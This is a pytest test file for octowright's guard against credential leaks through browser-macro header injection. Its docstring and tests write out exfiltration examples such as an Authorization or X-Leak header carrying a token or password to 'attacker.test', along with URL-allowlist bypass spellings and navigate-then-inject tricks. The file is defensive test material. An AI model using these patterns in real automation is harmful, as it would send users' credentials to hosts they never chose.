# SPDX-FileCopyrightText: Copyright (C) 2026 provide.io llc
# SPDX-License-Identifier: Apache-2.0
# SPDX-Comment: Part of octowright.
#

"""A credential may ride a header only to the session's own site, and only when asked.

Headers became a credential sink because ``inject_headers`` takes a
macro-chosen ``pattern``: ``{"pattern": "https://attacker.test/**",
"headers": {"X-Leak": "{{password}}"}}`` delivered the password to that host.
"Log in, then carry the token" is the ordinary use of a header, so the guard
can let a credential through when the pattern names -- literally, in the macro
-- a host the operator chose: the session's launch URL or its persona
``base_url``. Hosts the macro itself navigates to are not trusted; a poisoned
macro could navigate to its own server first.

Even then the pattern only scopes the FIRST hop. Playwright applies a routed
header override to every redirect the request starts, so a ``fetch`` on the
own site answered ``302 -> attacker`` carries the header there (measured on
chromium and firefox for every header name; webkit strips only
``Authorization``). The exemption therefore needs a per-header
``forward_on_redirect: {"Authorization": true}``, the macro author's statement
that the own site will not redirect that header somewhere it should not go.
"""

from __future__ import annotations

from typing import Any
from urllib.parse import urlsplit

import pytest

from octowright.defaults import get_default_url, new_tab_url
from octowright.macros.substitution import own_site_origins, substitute

TOKEN = {"token": "t0k3n-abc"}  # pragma: allowlist secret (synthetic fixture)
OWN = frozenset({("https", "app.example.test", 443)})


def _inject(pattern: str, header: str = "Bearer {{token}}", *, forward: object = True) -> list[dict[str, object]]:
    action: dict[str, object] = {"action": "inject_headers", "pattern": pattern, "headers": {"Authorization": header}}
    if forward is not None:
        action["forward_on_redirect"] = {"Authorization": forward}
    return [action]


@pytest.mark.parametrize(
    "pattern",
    ["https://app.example.test/**", "https://app.example.test/api/*", "https://APP.example.test:443/**"],
)
def test_a_credential_header_to_the_own_site_is_allowed_with_the_opt_in(pattern: str) -> None:
    [action] = substitute(_inject(pattern), TOKEN, trusted_origins=OWN)
    assert action["headers"] == {"Authorization": "Bearer t0k3n-abc"}


@pytest.mark.parametrize("forward", [None, False])
def test_without_the_opt_in_the_own_site_is_refused_and_told_how(forward: object) -> None:
    with pytest.raises(ValueError, match="credential arg") as excinfo:
        substitute(_inject("https://app.example.test/**", forward=forward), TOKEN, trusted_origins=OWN)
    message = str(excinfo.value)
    assert "forward_on_redirect" in message
    assert '"Authorization": true' in message
    assert "redirect" in message
    assert TOKEN["token"] not in message


@pytest.mark.parametrize("spelling", ["Authorization", "authorization", "AUTHORIZATION", " Authorization "])
def test_the_opt_in_matches_the_header_name_case_insensitively(spelling: str) -> None:
    actions = [
        {
            "action": "inject_headers",
            "pattern": "https://app.example.test/**",
            "headers": {"Authorization": "Bearer {{token}}"},
            "forward_on_redirect": {spelling: True},
        }
    ]
    [action] = substitute(actions, TOKEN, trusted_origins=OWN)
    assert action["headers"] == {"Authorization": "Bearer t0k3n-abc"}
    assert "forward_on_redirect" not in action["headers"]


def test_the_opt_in_covers_exactly_the_header_it_names() -> None:
    actions = [
        {
            "action": "inject_headers",
            "pattern": "https://app.example.test/**",
            "headers": {"Authorization": "Bearer {{token}}", "X-Trace": "{{token}}"},
            "forward_on_redirect": {"Authorization": True},
        }
    ]
    with pytest.raises(ValueError, match="X-Trace"):
        substitute(actions, TOKEN, trusted_origins=OWN)


@pytest.mark.parametrize(
    "opt_in",
    [
        {"Authorization": "true"},
        {"Authorization": 1},
        {"Authorization": None},
        {"Authorization": "{{flag}}"},
        True,
        ["Authorization"],
        "Authorization",
        {"X-Not-Sent": True},
    ],
    ids=["str", "int", "none", "placeholder", "bare-bool", "list", "str-name", "unknown-header"],
)
def test_a_malformed_opt_in_is_refused_not_coerced(opt_in: object) -> None:
    actions = [
        {
            "action": "inject_headers",
            "pattern": "https://app.example.test/**",
            "headers": {"Authorization": "Bearer {{token}}"},
            "forward_on_redirect": opt_in,
        }
    ]
    with pytest.raises(ValueError, match="forward_on_redirect"):
        substitute(actions, {**TOKEN, "flag": "true"}, trusted_origins=OWN)


def test_a_malformed_opt_in_is_refused_even_with_no_credential_in_play() -> None:
    actions = [
        {
            "action": "inject_headers",
            "pattern": "https://app.example.test/**",
            "headers": {"X-Env": "staging"},
            "forward_on_redirect": {"X-Env": "yes"},
        }
    ]
    with pytest.raises(ValueError, match="forward_on_redirect"):
        substitute(actions, {}, trusted_origins=OWN)


def test_the_sink_opt_out_still_allows_it_without_the_header_opt_in(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("OCTOWRIGHT_MACRO_CREDENTIAL_SINKS", "allow")
    [action] = substitute(_inject("https://app.example.test/**", forward=None), TOKEN, trusted_origins=OWN)
    assert action["headers"] == {"Authorization": "Bearer t0k3n-abc"}


def test_a_mocked_responses_headers_to_the_own_site_need_no_opt_in() -> None:
    """mock_route's headers are a RESPONSE served to the page: nothing is forwarded upstream."""
    actions = [{"action": "mock_route", "pattern": "https://app.example.test/**", "headers": {"X-T": "{{token}}"}}]
    [action] = substitute(actions, TOKEN, trusted_origins=OWN)
    assert action["headers"] == {"X-T": "t0k3n-abc"}


@pytest.mark.parametrize(
    "pattern",
    [
        "https://attacker.test/**",
        "**/*",  # every host
        "https://*.example.test/**",  # a wildcard host is not a named host
        "https://app.example.test.attacker.test/**",
        "https://app.example.test@attacker.test/**",
        "https://{{host}}/**",  # the macro would choose the host at run time
        "http://app.example.test/**",  # same host, another scheme
        "https://app.example.test:8443/**",  # same host, another port
        "app.example.test/**",  # no scheme: not an origin
        "https://app.example.test\\@attacker.test/**",
    ],
)
def test_a_credential_header_anywhere_else_is_refused(pattern: str) -> None:
    """The opt-in waives only the redirect refusal; it never makes another host an own site."""
    with pytest.raises(ValueError, match="credential arg") as excinfo:
        substitute(_inject(pattern), {**TOKEN, "host": "app.example.test"}, trusted_origins=OWN)
    assert '"Authorization": true' not in str(excinfo.value)  # not offered as the fix here


def test_no_trusted_origins_refuses_as_before() -> None:
    with pytest.raises(ValueError, match="credential arg"):
        substitute(_inject("https://app.example.test/**"), TOKEN)


def test_set_extra_http_headers_rides_every_host_and_stays_refused() -> None:
    actions = [{"action": "set_extra_http_headers", "headers": {"Authorization": "Bearer {{token}}"}}]
    with pytest.raises(ValueError, match="inject_headers"):
        substitute(actions, TOKEN, trusted_origins=OWN)


def test_a_mocked_body_stays_refused_even_on_the_own_site() -> None:
    """The exemption is for headers only; a mock body can be code the page runs."""
    actions = [{"action": "mock_route", "pattern": "https://app.example.test/**", "body": "{{token}}"}]
    with pytest.raises(ValueError, match="credential arg"):
        substitute(actions, TOKEN, trusted_origins=OWN)


def test_another_port_on_the_launch_host_is_not_the_own_site() -> None:
    """Comparing hostnames would trust every port on localhost.

    A launch at http://localhost:3000 exempted a header for
    http://localhost:45678/**, where another local user may be listening.
    """
    own = frozenset({("http", "localhost", 3000)})
    with pytest.raises(ValueError, match="credential arg"):
        substitute(_inject("http://localhost:45678/**"), TOKEN, trusted_origins=own)
    [action] = substitute(_inject("http://localhost:3000/**"), TOKEN, trusted_origins=own)
    assert action["headers"] == {"Authorization": "Bearer t0k3n-abc"}


def test_the_own_site_is_the_launch_url_and_the_base_url() -> None:
    class _Session:
        launch_url = "https://app.example.test/login"
        base_url = "https://api.example.test"

    assert own_site_origins(_Session()) == {("https", "app.example.test", 443), ("https", "api.example.test", 443)}  # type: ignore[arg-type]


def test_octowrights_own_new_tab_page_is_not_an_own_site() -> None:
    """A browser launched with no URL opens the daemon's new-tab page; that is not the app."""

    class _Session:
        launch_url = new_tab_url()
        base_url = "http://localhost:3000"  # a local dev stack is a real own site

    assert own_site_origins(_Session()) == {("http", "localhost", 3000)}  # type: ignore[arg-type]


@pytest.mark.parametrize("host", ["localhost", "[::1]"])
def test_the_new_tab_page_on_another_loopback_spelling_is_not_an_own_site(host: str) -> None:
    port = urlsplit(new_tab_url()).port

    class _Session:
        launch_url = f"http://{host}:{port}/new-tab/"
        base_url = None

    assert own_site_origins(_Session()) == set()  # type: ignore[arg-type]


def test_an_operator_default_url_is_an_own_site(monkeypatch: pytest.MonkeyPatch) -> None:
    """OCTOWRIGHT_DEFAULT_URL pointed at the operator's app makes a no-URL launch land there.

    The operator chose it exactly as they would a launch URL, so it is trusted;
    only the daemon's own page is excluded.
    """
    monkeypatch.setenv("OCTOWRIGHT_DEFAULT_URL", "https://app.example.test/home")

    class _Session:
        launch_url = get_default_url()
        base_url = None

    assert own_site_origins(_Session()) == {("https", "app.example.test", 443)}  # type: ignore[arg-type]


def test_the_current_page_url_is_not_an_own_site() -> None:
    class _Session:
        launch_url = "https://app.example.test/"
        url = "https://attacker.test/"
        base_url = None

    assert own_site_origins(_Session()) == {("https", "app.example.test", 443)}  # type: ignore[arg-type]


# --- run_macro hands the session's own site to substitution ------------------------------


def _session(tmp_path: Any, url: str) -> Any:
    from unittest.mock import AsyncMock, MagicMock

    from octowright.session.core import BrowserSession

    page = AsyncMock()
    page.url = url
    session = BrowserSession(
        instance_id="test",
        kind="chromium",
        label="t",
        url=url,
        launch_url=url,
        page=page,
        context=MagicMock(),
        browser=MagicMock(),
        log_path=tmp_path / "t.jsonl",
        recorder=MagicMock(),
    )
    session.inject_headers = AsyncMock(return_value={})  # type: ignore[method-assign]
    return session


@pytest.mark.anyio
async def test_run_macro_allows_a_token_header_to_the_launch_site(
    tmp_path: Any, monkeypatch: pytest.MonkeyPatch
) -> None:
    from octowright.macros import execution

    session = _session(tmp_path, "https://app.example.test/")
    monkeypatch.setattr(
        execution, "load_macro", lambda name: {"name": name, "actions": _inject("https://app.example.test/**")}
    )
    await execution.run_macro(session, "m", dict(TOKEN))
    session.inject_headers.assert_awaited_once()
    assert session.inject_headers.await_args.kwargs["headers"] == {"Authorization": "Bearer t0k3n-abc"}
    # A guard input, never a session-method argument.
    assert "forward_on_redirect" not in session.inject_headers.await_args.kwargs


@pytest.mark.anyio
async def test_run_macro_refuses_a_token_header_to_another_site(tmp_path: Any, monkeypatch: pytest.MonkeyPatch) -> None:
    from octowright.macros import execution

    session = _session(tmp_path, "https://app.example.test/")
    monkeypatch.setattr(
        execution, "load_macro", lambda name: {"name": name, "actions": _inject("https://attacker.test/**")}
    )
    with pytest.raises(ValueError, match="credential arg"):
        await execution.run_macro(session, "m", dict(TOKEN))
    session.inject_headers.assert_not_awaited()


# --- the own site is fixed at launch: navigating does not move it ------------------------
#
# ``session.url`` follows every navigate, so reading it made the macro's own
# ``navigate`` steps an allowlist edit: navigate to attacker.test, then name it
# in the pattern. The trusted hosts are the ones captured when the browser was
# launched, and nothing a macro does afterwards changes them.


def _navigate_then_inject(target: str) -> list[dict[str, object]]:
    return [{"action": "navigate", "url": "https://attacker.test/"}, *_inject(target)]


@pytest.mark.anyio
async def test_navigating_to_a_host_does_not_make_it_an_own_site(
    tmp_path: Any, monkeypatch: pytest.MonkeyPatch
) -> None:
    from octowright.macros import execution

    session = _session(tmp_path, "https://app.example.test/")
    await session.navigate("https://attacker.test/")
    monkeypatch.setattr(
        execution, "load_macro", lambda name: {"name": name, "actions": _inject("https://attacker.test/**")}
    )
    with pytest.raises(ValueError, match="credential arg"):
        await execution.run_macro(session, "m", dict(TOKEN))
    session.inject_headers.assert_not_awaited()


@pytest.mark.anyio
async def test_the_launch_site_stays_an_own_site_after_navigating_away(
    tmp_path: Any, monkeypatch: pytest.MonkeyPatch
) -> None:
    from octowright.macros import execution

    session = _session(tmp_path, "https://app.example.test/")
    await session.navigate("https://elsewhere.test/")
    monkeypatch.setattr(
        execution, "load_macro", lambda name: {"name": name, "actions": _inject("https://app.example.test/**")}
    )
    await execution.run_macro(session, "m", dict(TOKEN))
    session.inject_headers.assert_awaited_once()


@pytest.mark.anyio
async def test_a_macro_call_after_the_macros_own_navigate_is_refused(
    tmp_path: Any, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The nested call's trusted hosts used to be re-read after the parent's navigate ran."""
    from octowright.macros import execution

    macros = {
        "parent": [
            {"action": "navigate", "url": "https://attacker.test/"},
            {"action": "macro_call", "name": "child", "args": {"token": "{{token}}"}},
        ],
        "child": _inject("https://attacker.test/**"),
    }
    session = _session(tmp_path, "https://app.example.test/")
    monkeypatch.setattr(execution, "load_macro", lambda name: {"name": name, "actions": macros[name]})
    with pytest.raises(RuntimeError, match="credential arg"):
        await execution.run_macro(session, "parent", dict(TOKEN))
    session.inject_headers.assert_not_awaited()


@pytest.mark.anyio
async def test_a_sequence_step_after_a_navigating_step_is_refused(
    tmp_path: Any, monkeypatch: pytest.MonkeyPatch
) -> None:
    from octowright.macros import execution

    macros = {
        "go": [{"action": "navigate", "url": "https://attacker.test/"}],
        "leak": _inject("https://attacker.test/**"),
    }
    session = _session(tmp_path, "https://app.example.test/")
    monkeypatch.setattr(execution, "load_macro", lambda name: {"name": name, "actions": macros[name]})
    # A refused step is a failed step of the sequence (#248), not a raise.
    result = await execution.run_sequence(session=session, names=["go", "leak"], args_list=[{}, dict(TOKEN)])
    assert result["stopped_at"] == 1
    assert "credential arg" in result["steps"][1]["error"]
    assert TOKEN["token"] not in repr(result)
    session.inject_headers.assert_not_awaited()


def _built_session(tmp_path: Any, target_url: str, **overrides: Any) -> Any:
    from unittest.mock import MagicMock

    from octowright.browser_pool.launch_publish import _build_session_object
    from octowright.browser_pool.options import LaunchOptions

    page = MagicMock()
    page.video = None
    kwargs: dict[str, Any] = {
        "pool": MagicMock(),
        "instance_id": "i",
        "kind": "chromium",
        "label": None,
        "target_url": target_url,
        "base_url": None,
        "browser": None,
        "context": MagicMock(),
        "page": page,
        "recorder": MagicMock(),
        "log_path": tmp_path / "i.jsonl",
        "user_data_dir": None,
        "profile": None,
        "launch_options": LaunchOptions(protected=False),
        "har_path": None,
        "viewport_info": MagicMock(mode=MagicMock(value="unknown"), width=None, height=None),
        "operation_queue_timeout_seconds": 1.0,
    }
    return _build_session_object(**{**kwargs, **overrides})


@pytest.mark.anyio
async def test_the_launch_url_is_captured_at_launch_and_navigate_leaves_it(tmp_path: Any) -> None:
    from unittest.mock import AsyncMock

    session = _built_session(tmp_path, "https://app.example.test/")
    session.page = AsyncMock()
    assert session.launch_url == "https://app.example.test/"
    await session.navigate("https://attacker.test/")
    assert session.url == "https://attacker.test/"
    assert session.launch_url == "https://app.example.test/"


def test_the_session_base_url_is_the_one_the_context_was_launched_with(tmp_path: Any) -> None:
    """Resolved once in launch_execution and handed down, not re-read from the persona file."""
    session = _built_session(tmp_path, "https://app.example.test/", base_url="https://api.example.test")
    assert session.base_url == "https://api.example.test"


def test_a_relaunch_builds_its_session_with_the_original_launch_url(tmp_path: Any) -> None:
    """The replacement is published inside pool.launch, so it must be BUILT trusted right.

    Handoff/relaunch open the replacement at the page's current URL, which a
    macro may have chosen. Correcting ``launch_url`` after ``pool.launch``
    returned left the session listed, and macro-runnable, with the macro's URL
    as its own site in between.
    """
    from octowright.browser_pool.options import LaunchOptions

    session = _built_session(
        tmp_path,
        "https://attacker.test/landing",
        launch_options=LaunchOptions(protected=False, trusted_launch_url="https://app.example.test/"),
    )
    assert session.url == "https://attacker.test/landing"
    assert session.launch_url == "https://app.example.test/"


def test_a_launch_record_cannot_name_a_trusted_launch_url() -> None:
    """A JSONL relaunch reads only what the recording may choose; this is not one of them."""
    from octowright.browser_pool.options import LaunchOptions

    options = LaunchOptions.from_launch_record(
        {"kind": "chromium", "url": "https://a.test/", "trusted_launch_url": "x"}
    )
    assert options.trusted_launch_url is None
